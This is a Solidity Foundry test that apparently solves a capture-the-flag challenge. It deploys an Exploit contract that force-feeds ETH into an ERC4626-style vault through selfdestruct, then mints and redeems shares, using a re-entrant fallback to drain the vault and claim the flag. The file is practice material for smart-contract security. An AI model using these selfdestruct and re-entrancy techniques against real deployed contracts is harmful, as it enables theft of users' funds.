// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultTest is Test {
    Vault public vault;
    address player = makeAddr("player");
    address deployer = makeAddr("deployer");
    Destruct public destroyMe;

    function setUp() public {
        vm.startPrank(deployer);
        deal(deployer, 1 ether);

        destroyMe = new Destruct();
        vm.label(address(destroyMe), "destruct");

        vault = new Vault{value: 1 ether}();
        vm.label(address(vault), "target");

        vm.stopPrank();
    }

    function testAttack() public {
        vm.startPrank(player);
        deal(player, 1 ether);

        Exploit e = new Exploit(address(vault), address(destroyMe));
        deal(address(e), 2 ether);
        e.attack();
        vault.captureTheFlag(address(e));
        console.log("FLAGHOLDER:", vault.flagHolder());
    }
}

contract Exploit {
    address public vault;
    address public exploiter = address(this);
    uint256 counter;
    address public destroyMe;

    event ReceivedETH(address indexed caller, uint256 amount);

    constructor(address _vaultAddress, address _destroyMe) {
        vault = _vaultAddress;
        destroyMe = _destroyMe;
    }

    function attack() public {

        payable(destroyMe).transfer(1 ether);
        Destruct(payable(destroyMe)).kill(payable(vault));

        console.log(
            "vault shares after kill: ",
            ERC4626ETH(vault).totalSupply()
        );
        console.log(
            "vault assets after kill: ",
            ERC4626ETH(vault).totalAssets()
        );

        ERC4626ETH(vault).mint{value: 1 ether}(1 ether, exploiter);

        console.log(
            "vault shares after mint to attacker: ",
            ERC4626ETH(vault).totalSupply()
        );
        console.log(
            "vault assets after mint to attacker: ",
            ERC4626ETH(vault).totalAssets()
        );

        uint256 withdrawAmount = ERC4626ETH(vault).maxWithdraw(exploiter);
        ERC4626ETH(vault).redeem(withdrawAmount / 2, exploiter, exploiter);

        console.log(
            "vault shares after withdraw: ",
            ERC4626ETH(vault).totalSupply()
        );
        console.log(
            "vault assets after withdraw: ",
            ERC4626ETH(vault).totalAssets()
        );
    }

    fallback() external payable {
        emit ReceivedETH(msg.sender, msg.value);
        uint256 withdrawAmount = ERC4626ETH(vault).maxWithdraw(exploiter);

        if (withdrawAmount > 0) {
            ERC4626ETH(vault).redeem(withdrawAmount, exploiter, exploiter);
        }
    }
}

contract Destruct {
    fallback() external payable {}

    function kill(address payable receiver) external {
        selfdestruct(receiver);
    }
}
